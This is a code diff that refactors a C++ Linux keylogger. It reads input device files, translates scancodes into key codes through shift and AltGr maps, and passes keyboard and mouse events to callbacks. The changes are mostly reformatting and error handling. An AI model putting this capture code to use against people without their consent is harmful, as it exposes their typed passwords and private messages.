@@ -77,11 +77,14 @@ namespace spi::details
                                 if (keyEvent.state == proto::KeyState::Down)
                                     _capsStatus = !_capsStatus;
                                 break;
-                            case proto::KeyCode::Shift : _shiftStatus = keyEvent.state == proto::KeyState::Down;
+                            case proto::KeyCode::Shift :
+                                _shiftStatus = keyEvent.state == proto::KeyState::Down;
                                 break;
-                            case proto::KeyCode::AltGr : _altGrStatus = keyEvent.state == proto::KeyState::Down;
+                            case proto::KeyCode::AltGr :
+                                _altGrStatus = keyEvent.state == proto::KeyState::Down;
                                 break;
-                            default: break;
+                            default:
+                                break;
                         }
                     }
                     if (_altGrStatus)
@@ -90,12 +93,17 @@ namespace spi::details
                         _toBinds = &_shifted;
                     else
                         _toBinds = &_unaltered;
-                    _log(logging::Debug) << " code : " << ie.code << " event : " << keyEvent.code.toString() << " state = " << keyEvent.state.toString() << " value = " << ie.value << std::endl;
-                    if (!(keyEvent.state == proto::KeyState::Up && std::find(_printable.begin(), _printable.end(), ie.code) != _printable.end()) &&
-                        !(ie.value == 2 && std::find(_printable.begin(), _printable.end(), ie.code) == _printable.end())) {
+                    _log(logging::Debug) << " code : " << ie.code << " event : " << keyEvent.code.toString()
+                                         << " state = " << keyEvent.state.toString() << " value = " << ie.value
+                                         << std::endl;
+                    if (!(keyEvent.state == proto::KeyState::Up
+                          && std::find(_printable.begin(), _printable.end(), ie.code) != _printable.end())
+                        && !(ie.value == 2
+                             && std::find(_printable.begin(), _printable.end(), ie.code) == _printable.end())) {
                         _keyPressCallback(keyEvent);
                     } else
-                        _log(logging::Warning) << " Unhandled behavior {" << ie.code << " value : " << ie.value << "}" << std::endl;
+                        _log(logging::Warning) << " Unhandled behavior {" << ie.code << " value : " << ie.value << "}"
+                                               << std::endl;
                 } else {
                     _log(logging::Warning) << " Unhandled KeyEvent {" << ie.code << "}" << std::endl;
                 }
@@ -122,14 +130,15 @@ namespace spi::details
         bool _capsStatus{false};
         std::unordered_map<unsigned long, proto::KeyCode> const *_toBinds{&_unaltered};
 
-
         static const std::array<char, 47> _printable;
         static const std::unordered_map<unsigned long, proto::KeyCode> _unaltered;
         static const std::unordered_map<unsigned long, proto::KeyCode> _shifted;
         static const std::unordered_map<unsigned long, proto::KeyCode> _altGred;
     };
 
-    const std::array<char, 47> FileWatcher::_printable = {16,17,18,19,20,21,22,23,24,25,30,31,32,33,34,35,36,37,38,39,44,45,46,47,48,49,11,2,3,4,5,6,7,8,9,10,12,13,26,27,40,43,50,51,52,53,86};
+    const std::array<char, 47> FileWatcher::_printable = {16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 30, 31, 32, 33, 34,
+                                                          35, 36, 37, 38, 39, 44, 45, 46, 47, 48, 49, 11, 2, 3, 4, 5, 6,
+                                                          7, 8, 9, 10, 12, 13, 26, 27, 40, 43, 50, 51, 52, 53, 86};
     const std::unordered_map<unsigned long, proto::KeyCode> FileWatcher::_unaltered = {
         {16,  proto::KeyCode::a},
         {17,  proto::KeyCode::z},
@@ -303,7 +312,7 @@ namespace spi::details
         {13,  proto::KeyCode::Plus}
     };
     const std::unordered_map<unsigned long, proto::KeyCode> FileWatcher::_altGred = {
-        {17, proto::KeyCode::Inferior},
+        {17,  proto::KeyCode::Inferior},
         {18,  proto::KeyCode::Euro},
         {39,  proto::KeyCode::Mu},
         {45,  proto::KeyCode::Superior},
@@ -381,38 +390,40 @@ namespace spi
 
         ~LinuxKeyLogger() override
         {
-            _log(logging::Info) << "shutting down." << std::endl;
+            _log(logging::Info) << "Shutting down" << std::endl;
         }
 
-        void setup() override
+        bool setup() noexcept override
         {
             for (const auto &i : _keyPadToWatch) {
                 int currentFd = ::open(i.c_str(), O_RDONLY);
 
                 if (currentFd == -1) {
-                    throw std::runtime_error("Cannot Open File");
+                    _log(logging::Error) << "Unable to open file '" << i << "'" << std::endl;
+                    return false;
                 }
                 _keyInputStream.push_back(details::FileWatcher(_service, currentFd));
-                _keyInputStream.back().asyncRead();
                 _keyInputStream.back().onMouseMoveEvent(boost::bind(&LinuxKeyLogger::__onMouEv, this, _1));
                 _keyInputStream.back().onMouseClickEvent(boost::bind(&LinuxKeyLogger::__onCliEv, this, _1));
                 _keyInputStream.back().onKeyboardEvent(boost::bind(&LinuxKeyLogger::__onKeyEv, this, _1));
             }
 
-            _log(logging::Info) << "successfully initialized." << std::endl;
+            _log(logging::Info) << "Successfully initialized" << std::endl;
+            return true;
         }
 
         void run() override
         {
-            _log(logging::Info) << "started." << std::endl;
+            _log(logging::Info) << "Starting" << std::endl;
 
-            // add the watchers on the files
-            // non blocking read with callback on event
+            for (auto &cur : _keyInputStream) {
+                cur.asyncRead();
+            }
         }
 
         void stop() override
         {
-            _log(logging::Info) << "stopped." << std::endl;
+            _log(logging::Info) << "Stopping" << std::endl;
             _keyInputStream.clear();
             _mouseInputStream.clear();
         }
